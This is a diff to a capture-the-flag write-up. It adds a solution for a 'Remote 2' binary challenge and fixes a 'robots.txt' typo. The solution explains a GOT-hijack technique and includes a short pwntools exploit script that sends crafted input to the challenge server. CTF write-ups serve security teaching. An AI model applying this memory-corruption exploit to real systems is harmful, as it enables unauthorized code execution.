@@ -124,7 +124,18 @@ You can follow [this write-up](http://mslc.ctf.su/wp/plaidctf-2012-format-99-pwn
 
 ## Remote 2
 
-TBA.
+The program will ask you to give itself your name up to 100 bytes, and if you disassemble it, you'll find the last four bytes will be passed as store address of first scanf function. Thus, you can `readelf -r ./remote2` to check GOT addresses of all functions, and your last four bytes should be replace by any of addresses. Then, you can GOT hijack the program to jump to any position depending on your input passing to the first scanf. Following is my example exploit script:
+
+```python
+from pwn import *
+
+r = remote('quiz.ais3.org', 53125)
+print r.recv()
+r.sendline('A'*96 + p32(0x0804a038))
+print r.recv()
+r.sendline(str(0x080486d9))
+print r.recvall()
+```
 
 ## Remote 3
 
@@ -132,7 +143,7 @@ TBA.
 
 ## Web 1
 
-It's because `robot.txt` that Google bot cannot do anything.
+It's because `robots.txt` that Google bot cannot do anything.
 
 ## Web 2
 
